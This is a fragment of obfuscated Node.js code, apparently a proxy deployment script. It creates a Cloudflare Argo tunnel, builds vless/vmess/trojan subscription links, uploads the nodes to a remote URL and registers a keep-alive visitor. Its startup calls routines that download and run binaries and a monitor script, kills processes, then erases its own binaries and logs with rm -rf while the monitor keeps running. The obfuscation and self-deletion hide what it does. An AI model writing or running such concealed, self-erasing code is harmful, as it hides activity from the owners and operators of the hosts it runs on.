_0xdaa661=_0x4d35a3;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAI'+'N\x20或\x20ARGO_A'+'UTH\x20变量为空，使'+'用快速隧道');return;}if(ARGO_AUTH['includes']('TunnelSecr'+'et'))try{const _0x508d21=JSON[_0xdaa661(0x169)](ARGO_AUTH),_0x2812ba=_0x508d21[_0xdaa661(0x1e3)];fs['writeFileS'+_0xdaa661(0x1fc)](tunnelJsonPath,ARGO_AUTH);const _0x5c0b6d=_0xdaa661(0x16d)+_0x2812ba+(_0xdaa661(0x154)+_0xdaa661(0x229))+tunnelJsonPath+('\x0aprotocol:'+_0xdaa661(0x199)+_0xdaa661(0x1f8)+'\x20hostname:'+'\x20')+ARGO_DOMAIN+('\x0a\x20\x20\x20\x20servi'+'ce:\x20http:/'+'/localhost'+':')+EXTERNAL_PORT+(_0xdaa661(0x208)+'nRequest:\x0a'+'\x20\x20\x20\x20\x20\x20noTL'+'SVerify:\x20t'+'rue\x0a\x20\x20-\x20se'+'rvice:\x20htt'+'p_status:4'+'04\x0a');fs['writeFileS'+'ync'](tunnelYamlPath,_0x5c0b6d),console['log'](_0xdaa661(0x18c)+'成功');}catch(_0x352804){console[_0xdaa661(0x21c)]('生成隧道配置错误:',_0x352804);}else console['log'](_0xdaa661(0x142)+'不是TunnelSe'+'cret格式，使用t'+_0xdaa661(0x20f));}async function getMetaInfo(){const _0x190037=_0x4d35a3;try{const _0xa2666b=await axios[_0x190037(0x14f)](_0x190037(0x219)+'api.co/jso'+'n/',{'timeout':0xbb8});if(_0xa2666b[_0x190037(0x21a)]&&_0xa2666b['data']['country_co'+'de']&&_0xa2666b['data']['org'])return(_0xa2666b[_0x190037(0x21a)]['country_co'+'de']+'_'+_0xa2666b['data'][_0x190037(0x224)])['replace'](/ /g,'_');}catch(_0x587118){try{const _0x3e67f1=await axios['get']('http://ip-'+'api.com/js'+'on/',{'timeout':0xbb8});if(_0x3e67f1[_0x190037(0x21a)]&&_0x3e67f1[_0x190037(0x21a)]['status']===_0x190037(0x215)&&_0x3e67f1[_0x190037(0x21a)][_0x190037(0x171)+'e']&&_0x3e67f1['data'][_0x190037(0x224)])return(_0x3e67f1['data']['countryCod'+'e']+'_'+_0x3e67f1['data']['org'])['replace'](/ /g,'_');}catch(_0x11f151){}}return _0x190037(0x1c8);}async function extractDomains(){const _0xdca582=_0x4d35a3;let _0x3c88de;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3c88de=ARGO_DOMAIN,console['log'](_0xdca582(0x1c5)+'N:',_0x3c88de),await _0x40e67c(_0x3c88de);else try{const _0x13fed1=fs[_0xdca582(0x151)+'nc'](bootLogPath,'utf-8'),_0x394f9d=_0x13fed1[_0xdca582(0x1ff)]('\x0a'),_0x28614f=[];_0x394f9d[_0xdca582(0x1b4)](_0x476f64=>{const _0x15c79d=_0xdca582,_0x455c07=_0x476f64['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x455c07){const _0x4074f7=_0x455c07[0x1];_0x28614f[_0x15c79d(0x1d2)](_0x4074f7);}});if(_0x28614f[_0xdca582(0x1a4)]>0x0)_0x3c88de=_0x28614f[0x0],console['log']('ArgoDomain'+':',_0x3c88de),await _0x40e67c(_0x3c88de);else{console['log'](_0xdca582(0x20b)+_0xdca582(0x1b3)+'t获取ArgoDom'+_0xdca582(0x1c4)),fs[_0xdca582(0x1c7)](bootLogPath);async function _0x374be4(){const _0x31d1ce=_0xdca582;try{process[_0x31d1ce(0x1ab)]===_0x31d1ce(0x18a)?await exec(_0x31d1ce(0x214)+'f\x20/im\x20'+botName+('.exe\x20>\x20nul'+'\x202>&1')):await exec('pkill\x20-f\x20\x22'+'['+botName['charAt'](0x0)+']'+botName[_0x31d1ce(0x213)](0x1)+('\x22\x20>\x20/dev/n'+_0x31d1ce(0x227)));}catch(_0x486c2b){}}_0x374be4(),await new Promise(_0x275484=>setTimeout(_0x275484,0xbb8));const _0x4cb980='tunnel\x20--e'+_0xdca582(0x159)+_0xdca582(0x153)+'--no-autou'+'pdate\x20--pr'+'otocol\x20htt'+_0xdca582(0x18b)+_0xdca582(0x1cd)+bootLogPath+('\x20--logleve'+'l\x20info\x20--u'+'rl\x20http://'+_0xdca582(0x226))+EXTERNAL_PORT;try{await exec(_0xdca582(0x1e5)+botPath+'\x20'+_0x4cb980+('\x20>/dev/nul'+'l\x202>&1\x20&')),console['log'](botName+_0xdca582(0x15f)),await new Promise(_0x50fd2c=>setTimeout(_0x50fd2c,0xbb8)),await extractDomains();}catch(_0x5a7df2){console[_0xdca582(0x21c)](_0xdca582(0x1c9)+_0x5a7df2);}}}catch(_0x24bca5){console['error'](_0xdca582(0x1b8)+_0xdca582(0x1e6),_0x24bca5);}async function _0x40e67c(_0x5f88fd){const _0x4898dc=_0xdca582,_0x154225=await getMetaInfo(),_0x1881d0=NAME?NAME+'-'+_0x154225:_0x154225,_0xeee0d={'v':'2','ps':_0x1881d0,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4898dc(0x190),'net':'ws','type':'none','host':_0x5f88fd,'path':_0x4898dc(0x186)+_0x4898dc(0x23e),'tls':'tls','sni':_0x5f88fd,'fp':_0x4898dc(0x18f)},_0x19f115=Buffer[_0x4898dc(0x163)](JSON['stringify'](_0xeee0d))['toString']('base64'),_0x410fa4='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+('?encryptio'+'n=none&sec'+_0x4898dc(0x16f)+'sni=')+_0x5f88fd+(_0x4898dc(0x225)+_0x4898dc(0x178)+_0x4898dc(0x1b1))+_0x5f88fd+('&path=%2Fv'+'less-argo%'+_0x4898dc(0x21b)+'0#')+_0x1881d0+'\x0a\x0avmess://'+_0x19f115+('\x0a\x0atrojan:/'+'/')+UUID+'@'+CFIP+':'+CFPORT+(_0x4898dc(0x19b)+'tls&sni=')+_0x5f88fd+('&fp=firefo'+'x&type=ws&'+'host=')+_0x5f88fd+('&path=%2Ft'+'rojan-argo'+'%3Fed%3D25'+'60#')+_0x1881d0+'\x0a\x20\x20\x20\x20';return console['log']('订阅内容Base64'+':'),console[_0x4898dc(0x1cf)](Buffer['from'](_0x410fa4)['toString'](_0x4898dc(0x200))),subscriptionContent=_0x410fa4,fs[_0x4898dc(0x1ea)+_0x4898dc(0x1fc)](subPath,Buffer['from'](_0x410fa4)[_0x4898dc(0x17f)](_0x4898dc(0x200))),console[_0x4898dc(0x1cf)](subPath+'\x20保存成功'),uploadNodes(),_0x410fa4;}}async function uploadNodes(){const _0x365ae6=_0x4d35a3;if(UPLOAD_URL&&PROJECT_URL){const _0xc50562=PROJECT_URL+'/'+SUB_PATH,_0x309f29={'subscription':[_0xc50562]};try{const _0x164147=await axios['post'](UPLOAD_URL+(_0x365ae6(0x1e4)+'ubscriptio'+'ns'),_0x309f29,{'headers':{'Content-Type':'applicatio'+_0x365ae6(0x1ca)}});return _0x164147&&_0x164147[_0x365ae6(0x183)]===0xc8?(console[_0x365ae6(0x1cf)](_0x365ae6(0x1f0)),_0x164147):null;}catch(_0x14d71e){if(_0x14d71e['response']){if(_0x14d71e[_0x365ae6(0x193)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x25a417=fs[_0x365ae6(0x151)+'nc'](listPath,_0x365ae6(0x205)),_0x230f9d=_0x25a417['split']('\x0a')['filter'](_0x162a41=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x162a41));if(_0x230f9d['length']===0x0)return;const _0x2ac5f6=JSON['stringify']({'nodes':_0x230f9d});try{const _0xba84fc=await axios['post'](UPLOAD_URL+(_0x365ae6(0x1ba)+'odes'),_0x2ac5f6,{'headers':{'Content-Type':_0x365ae6(0x19d)+'n/json'}});return _0xba84fc&&_0xba84fc['status']===0xc8?(console[_0x365ae6(0x1cf)]('节点上传成功'),_0xba84fc):null;}catch(_0x12ceb3){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3c4589=_0x3018,_0x541655=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x541655['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x541655[_0x3c4589(0x1d2)](phpPath);process[_0x3c4589(0x1ab)]===_0x3c4589(0x18a)?exec('del\x20/f\x20/q\x20'+_0x541655[_0x3c4589(0x21e)](_0x342679=>fs[_0x3c4589(0x20a)](_0x342679))[_0x3c4589(0x19f)]('\x20')+(_0x3c4589(0x233)+'1'),_0x1b3964=>{const _0x2c09fc=_0x3c4589;console[_0x2c09fc(0x15d)](),console['log'](_0x2c09fc(0x1f1)),console['log']('监控脚本已保留，继续'+'运行'),console['log'](_0x2c09fc(0x21f)+'吧！');}):exec('rm\x20-rf\x20'+_0x541655[_0x3c4589(0x21e)](_0x276be6=>fs['existsSync'](_0x276be6))[_0x3c4589(0x19f)]('\x20')+(_0x3c4589(0x1e0)+'l\x202>&1'),_0x39d901=>{const _0x4bc972=_0x3c4589;console['clear'](),console['log'](_0x4bc972(0x1f1)),console['log']('监控脚本已保留，继续'+'运行'),console['log']('感谢使用此脚本，享受'+'吧！');});},0x15f90);}async function AddVisitTask(){const _0x20c281=_0x4d35a3;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('跳过添加自动访问任务');return;}try{const _0x39dc9f=await axios['post']('https://oo'+'oo.serv00.'+'net/add-ur'+'l',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x20c281(0x19d)+'n/json'}});return console['log'](_0x20c281(0x1dc)),_0x39dc9f;}catch(_0x21a922){return console['error']('添加自动访问任务失败'+':\x20'+_0x21a922['message']),null;}}async function startserver(){const _0x2d0f55=_0x4d35a3;try{console['log']('开始服务器初始化..'+'.'),deleteNodes(),cleanupOldFiles(),argoType(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await downloadAndRunMonitorScript(),await AddVisitTask(),cleanFiles(),console[_0x2d0f55(0x1cf)]('服务器初始化完成');}catch(_0x4c2309){console['error']('startserve'+'r错误:',_0x4c2309);}}app[_0x4d35a3(0x1bb)](PORT,()=>console[_0x4d35a3(0x1cf)](_0x4d35a3(0x22c)+_0x4d35a3(0x202)+PORT)),startserver()[_0x4d35a3(0x144)](_0x39f1e3=>{const _0x1353c0=_0x4d35a3;console['error'](_0x1353c0(0x1c2)+'erver错误:',_0x39f1e3);});
